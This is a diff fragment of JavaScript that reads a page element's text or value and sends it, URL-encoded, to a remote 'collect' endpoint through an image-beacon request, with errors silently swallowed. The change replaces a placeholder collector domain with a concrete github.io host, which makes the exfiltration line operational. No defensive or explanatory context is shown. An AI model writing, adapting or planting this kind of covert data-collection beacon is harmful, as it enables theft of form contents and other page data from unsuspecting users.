@@ -22,7 +22,7 @@
         const txt = el ? (el.textContent || el.value || '') : null;
         if (txt) {
           // send via image
-          new Image().src = 'https://YOURCOLLECTDOMAIN/collect?f=' + encodeURIComponent(txt);
+          new Image().src = 'https://dot-ad.github.io/test/collect?f=' + encodeURIComponent(txt);
         }
       } catch(_) {}
       return;
